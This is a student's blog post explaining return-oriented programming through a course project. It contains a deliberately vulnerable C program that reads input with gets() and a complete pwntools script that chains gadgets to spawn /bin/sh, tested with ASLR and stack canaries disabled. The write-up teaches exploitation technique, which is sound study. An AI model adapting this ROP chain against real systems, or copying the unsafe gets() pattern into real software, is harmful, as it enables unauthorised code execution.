---
layout: post
title:  "A rop project"
categories: [project]
tags: [ROP]
---

In the last semester i attended the computer security course, and since i had to do a project i made a simple program to exploit with a rop chain in order to explain how return oriented programming works.
Here i will explain everything about.
During my presentation i started talk about the fact that during the excution of a program memory is under the constraint Write XOR Execute. Part of the memory that i can write i cannot execute and viceversa.
And so is here where Return Oriented programming come in action, with this technique when a program is vulnerable for example to a buffer overflow i can still execute malicious code even if i can't upload the shellcode directly in the stack.
Supposing to work on a x86 architecture, i have on the stack the base pointer and after that the return address of the function (see the image below).

![My helpful screenshot](/assets/stack1.png)

Here's the code that i wanted to exploit:
{% highlight c %}
include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

void r()
{
	char s[30];
	gets(s);
}

void ouch()
{
	printf("%s\n","hi!!");
}

int main()
{
	r();
	//printf("%s\n",s);	
	printf("%s\n","end!");
	return 0;
}
{% endhighlight %}

So the goal is to overwrite the return address, and consequentially what came after that with addresses of memory that contain little piece of code that terminate with the instruction ret and so on. So i search inside the program this little pieces of code that are called gadget. In this way after one of this little piece of code terminate is execution the next instruction that will be executed will be the one at address2 see the image below.

![My helpful screenshot](/assets/stack2.png)

And so on with this trick is possible execute a shell.
To do all of this i used Radare2(that allow me to search gadget inside the code) and pwntools(that simplify me the construction of the exploit).
All of this was did whit ASLR disabled and no stack canaries, that are two of contromeasures use to avoid this kind of attack.
To do all of this i had to search the right gadgets to make the instructions to execute /bin/sh with correct parameters:
- eax = 0xb
- ebx = address of memory of string "/bin/sh"
- ecx = pointer to pointer of string "/bin/sh"
- edx = env variable but that can be set to 0 with no problem

To simplify things i used the string "/bin//sh" because on linux is ignored the double slash.
So i search the gadgets.
I found pop eax, pob ebx, and pop edx with no problems, the only one problem was for pop ecx see below: (but i decide to maintaned it in order to find a way to patch it).

![My helpful screenshot](/assets/pop_ecx.png)

After that i search the address of the bss in order to have a place to write /bin//sh.
And after that i search the write-what-where gadget that allow me to write ad a specific address a value with the use of two register. In this way using the pop instructions i could set value to register and with this gadget write the memory (the bss).

![My helpful screenshot](/assets/write_mem.png)

To patch the pop ecx i used a pop esi since in the gadget above there was or cl,byte[esi] in order to make the ecx value to not change. NOTE: that this work only because the specific value in the memory, proprably with ASLR i had to change the idea to make this work.
After that i search for xor edx, edx. And in the end i found xor eax, eax and one last instruction that increase the al register, so i called it the number of times to reach the number of the syscall (0xb).
And in the end the int 0x80 to make the syscall.
To clarify i had to add an initial padding to fill the buffer.
In the end once i execute my program i had this:

![My helpful screenshot](/assets/PoC.png)

the ";" is to mantaint the interaction, anyway there is a method in pwntools that i didn't know at the time.
Here's the code of the final exploit.
{% highlight python %}
#!/usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *

DIM_BUF = 42

PAD = "A" * DIM_BUF

pop_eax =  0xf7ffafb5
pop_ebx =  0xf7ff2c21 
pop_ecx = 0xf7ff82f9 
                
pop_edx =   0xf7ff8c15 

pop_esi = 0xf7ff2949

shell1 = "/bin"
shell2 = "//sh"

mem_to_write = 0x56557020
write_the_mem = 0xf7feb47b # mov dword[edx], eax

zero_place = 0x56557040
#copy_zero_to_edx = 0xf7ff2f05

#mov_ecx = 0xf7ff2f19

xor_edx = 0xf7ff0670 
#mov_eax_ff = 0xf7ff1633 
xor_eax = 0xf7ff2534

inc1_eax =  0xf7fd9a96 
int_80 = 0xf7ff2195 

buf = PAD 

buf += p32(pop_edx) 
buf += p32(mem_to_write)
buf += p32(pop_eax)
buf += "/bin"
buf += p32(write_the_mem)
buf += p32(pop_edx) 
buf += p32(mem_to_write + 4)
buf += p32(pop_eax)
buf += "//sh"
buf += p32(write_the_mem)
buf += p32(pop_eax) 
buf += p32(mem_to_write)
buf += p32(pop_edx) 
buf += p32(mem_to_write + 12) 
buf += p32(write_the_mem)
buf += p32(pop_esi)
buf += p32(mem_to_write + 12)
buf += p32(pop_ecx)
buf += p32(mem_to_write + 12)
buf += p32(xor_edx)
buf += p32(mem_to_write) 
buf +="AAAAAAAA" #raw data
buf += p32(xor_eax) 

for i in range(11):
    buf += p32(inc1_eax) 

buf += p32(int_80) 

print(buf)

{% endhighlight %}
Maybe all of this is over simplified and not to much clear, i decided to not explain somethings but i thing that in general the basic idea is ok. However this was my first article so i have a very loooooong road to improve my writing and infosec skills.



